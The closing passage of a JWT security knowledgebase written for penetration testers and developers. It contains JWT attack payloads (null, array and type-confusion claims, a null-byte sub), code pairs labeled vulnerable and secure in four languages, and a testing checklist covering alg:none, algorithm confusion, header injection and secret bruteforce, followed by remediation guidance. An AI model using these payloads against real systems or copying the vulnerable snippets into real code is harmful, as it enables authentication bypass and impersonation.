// Empty payload
eyJhbGciOiJIUzI1NiJ9..SIGNATURE

// Null claims
{"sub": null, "role": null}

// Array claims
{"sub": ["admin", "user"], "role": ["admin"]}

// Type confusion
{"isAdmin": 1, "role": 0}

// Unicode sub
{"sub": "admin"}

// Null byte injection
{"sub": "admin\x00user"}
```

---

## JWT in Different Programming Languages

### Node.js jsonwebtoken

```javascript
// VULNERABLE - decode without verify
const decoded = jwt.decode(token);  // NEVER do this for auth

// SECURE - verify with explicit algorithm
const verified = jwt.verify(token, secret, { algorithms: ['HS256'] });

// VULNERABLE - accepts any algorithm
jwt.verify(token, secret);  // Missing algorithms option

// SECURE - strict algorithm whitelist
jwt.verify(token, secret, { 
    algorithms: ['HS256'],
    clockTolerance: 30,
    maxAge: '1h'
});
```

### Python PyJWT

```python
# VULNERABLE - decode without verify
decoded = jwt.decode(token, options={"verify_signature": False})

# SECURE - verify with explicit algorithm
decoded = jwt.decode(token, secret, algorithms=['HS256'])

# VULNERABLE - accepts any algorithm (PyJWT < 2.0)
decoded = jwt.decode(token, secret)  # Missing algorithms

# SECURE - strict validation
decoded = jwt.decode(
    token, 
    secret, 
    algorithms=['HS256'],
    options={"require": ["exp", "iat", "sub"]}
)
```

### Java jjwt

```java
// SECURE - explicit algorithm
Jwts.parser()
    .setSigningKey(secret)
    .requireIssuer("trusted-issuer")
    .requireAudience("expected-audience")
    .parseClaimsJws(token);

// VULNERABLE - missing validation
Jwts.parser()
    .setSigningKey(secret)
    .parseClaimsJws(token);  // Missing require* calls
```

### PHP firebase/php-jwt

```php
// SECURE - explicit algorithm
$decoded = JWT::decode($token, $key, ['HS256']);

// VULNERABLE - accepts any algorithm (old versions)
$decoded = JWT::decode($token, $key);  // Missing allowed_algs
```

---

## JWT Security Testing Checklist

### Phase 1: Reconnaissance

- [ ] Identify all JWT usage points (headers, cookies, body, URL params)
- [ ] Decode and analyze header structure (alg, kid, jku, jwk, x5u, x5c)
- [ ] Decode and analyze payload claims (sub, role, exp, iss, aud)
- [ ] Check for JWKS endpoints (/.well-known/jwks.json, /jwks.json)
- [ ] Check for OAuth/OpenID endpoints
- [ ] Identify JWT library and version (if possible)
- [ ] Check token expiration policy
- [ ] Check token refresh mechanism

### Phase 2: Signature Verification Testing

- [ ] Modify payload claim and observe response
- [ ] Remove signature entirely and observe response
- [ ] Replace signature with random string
- [ ] Test with alg: none (and case variations)
- [ ] Test with null signature (empty signature)

### Phase 3: Algorithm Testing

- [ ] Test algorithm confusion (RS256 -> HS256)
- [ ] Test algorithm confusion (ES256 -> HS256)
- [ ] Test algorithm confusion (PS256 -> HS256)
- [ ] Test with unsupported algorithms
- [ ] Test algorithm array injection

### Phase 4: Header Injection Testing

- [ ] Test JWK injection (embedded public key)
- [ ] Test JKU injection (external JWKS URL)
- [ ] Test x5u injection (external cert URL)
- [ ] Test x5c injection (embedded cert chain)
- [ ] Test kid path traversal
- [ ] Test kid SQL injection
- [ ] Test kid command injection

### Phase 5: Secret Testing

- [ ] Bruteforce with common secrets list
- [ ] Bruteforce with application-specific wordlist
- [ ] Test blank/empty secret
- [ ] Test null byte secret
- [ ] Test with hashcat (GPU acceleration)

### Phase 6: Claim Testing

- [ ] Modify sub claim (user impersonation)
- [ ] Modify role/permission claims (privilege escalation)
- [ ] Modify exp claim (token lifetime extension)
- [ ] Modify aud claim (cross-service replay)
- [ ] Modify iss claim (issuer spoofing)
- [ ] Inject new claims
- [ ] Test claim type confusion

### Phase 7: Context-Specific Testing

- [ ] Test JWT in different storage contexts (cookie, localStorage, header)
- [ ] Test CORS misconfigurations with JWT
- [ ] Test cache poisoning with JWT
- [ ] Test request smuggling with JWT
- [ ] Test OAuth-specific JWT attacks
- [ ] Test GraphQL JWT context
- [ ] Test WebSocket JWT authentication

### Phase 8: Advanced Testing

- [ ] Test JWE-specific attacks (if applicable)
- [ ] Test timing attacks on signature verification
- [ ] Test JWT in microservices/service mesh
- [ ] Test JWT in serverless functions
- [ ] Test JWT in mobile applications
- [ ] Test JWT in blockchain/Web3 contexts

---

## Common JWT Error Messages and Their Meanings

| Error Message | Likely Cause | Attack Vector |
|--------------|-------------|---------------|
| "Invalid signature" | Signature verification failed | Weak secret, algorithm confusion |
| "Token expired" | exp claim validation | Clock skew, exp manipulation |
| "Invalid algorithm" | alg not in whitelist | alg:none, algorithm confusion |
| "Invalid kid" | Key ID not found | kid path traversal, SQLi |
| "Invalid issuer" | iss claim validation | Issuer spoofing |
| "Invalid audience" | aud claim validation | Audience confusion |
| "Malformed token" | Parsing error | Parser confusion payloads |
| "Token not yet valid" | nbf claim validation | nbf manipulation |
| "Key not found" | JWKS lookup failed | JKU injection, JWKS spoofing |
| "Invalid key format" | Key parsing error | JWK injection, x5c injection |

---

## JWT Remediation Guide

### For Developers

1. **Always verify signatures** - Never use decode() without verify()
2. **Whitelist algorithms** - Explicitly specify allowed algorithms
3. **Reject alg:none** - Never accept unsecured JWTs
4. **Use strong secrets** - Minimum 256-bit random secrets for HMAC
5. **Validate all claims** - exp, nbf, iss, aud, sub
6. **Short expiration** - Tokens should expire within minutes/hours
7. **Proper key management** - Use HSM/KMS for secret storage
8. **Constant-time comparison** - Prevent timing attacks
9. **Input validation** - Validate kid, jku, jwk parameters
10. **HTTPS only** - Never transmit JWTs over HTTP

### For Security Teams

1. **Regular audits** - Review JWT implementation annually
2. **Penetration testing** - Include JWT-specific tests
3. **Monitoring** - Log JWT validation failures
4. **Alerting** - Alert on suspicious JWT patterns
5. **Key rotation** - Rotate keys regularly with zero downtime
6. **Library updates** - Keep JWT libraries updated
7. **Training** - Educate developers on JWT security

---

## Resources and Further Reading

### Official Documentation

- [RFC 7519 - JWT](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7515 - JWS](https://datatracker.ietf.org/doc/html/rfc7515)
- [RFC 7516 - JWE](https://datatracker.ietf.org/doc/html/rfc7516)
- [RFC 7517 - JWK](https://datatracker.ietf.org/doc/html/rfc7517)
- [RFC 7518 - JWA](https://datatracker.ietf.org/doc/html/rfc7518)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)

### Research Papers

- [Attacking JWT Authentication - Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
- [Critical Vulnerabilities in JWT Libraries - Auth0](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [JWT Security Best Practices - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

### Tools

- [jwt_tool](https://github.com/ticarpi/jwt_tool) - Comprehensive JWT testing
- [jwt.io](https://jwt.io/) - JWT decoder/debugger
- [jwt-secrets](https://github.com/wallarm/jwt-secrets) - Secret wordlist
- [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - Fast cracker
- [sig2n](https://hub.docker.com/r/portswigger/sig2n) - Public key derivation
- [jws2pubkey](https://github.com/SecuraBV/jws2pubkey) - Key derivation

### Training Platforms

- [PortSwigger Web Security Academy - JWT Labs](https://portswigger.net/web-security/jwt)
- [HackTheBox - JWT Challenges](https://www.hackthebox.com/)
- [TryHackMe - JWT Room](https://tryhackme.com/)

---

> **END OF COMPLETE JWT SECURITY KNOWLEDGEBASE**
>
> **Document Statistics:**
> - Total Sections: 45+
> - Total CVEs Referenced: 25+
> - Total Tools Listed: 20+
> - Total Payloads: 300+
> - Total Attack Vectors: 50+
> - File Size: ~100KB
>
> **Last Updated:** 2026-05-24
> **Compiled from:** PortSwigger Web Security Academy, HackTricks, PayloadsAllTheThings, ProjectDiscovery, jwt_tool official docs, and real-world bug bounty research.
>
> **Disclaimer:** This knowledgebase is for authorized security testing and educational purposes only. Always ensure you have proper written authorization before testing any system.
